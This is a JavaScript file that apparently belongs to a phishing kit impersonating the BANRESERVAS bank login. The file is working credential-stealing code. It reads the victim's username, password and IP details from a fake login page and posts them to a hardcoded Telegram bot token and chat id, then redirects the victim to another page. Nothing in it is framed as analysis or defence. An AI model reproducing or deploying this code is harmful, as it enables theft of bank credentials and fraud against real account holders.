//bot token
var telegram_bot_id = "6897156936:AAG0flQ523Ry86PqBj_F9Xtk-a7NkMM_GIM";
//chat id
var chat_id = 5157616506;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("user").value;
    u_name2 = document.getElementById("contra").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "BANRESERVAS\nUsuario: " + u_name + "\nContraseña: " + u_name2 + "\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'esp.html';
        console.log(response);
    });
    return false;
};
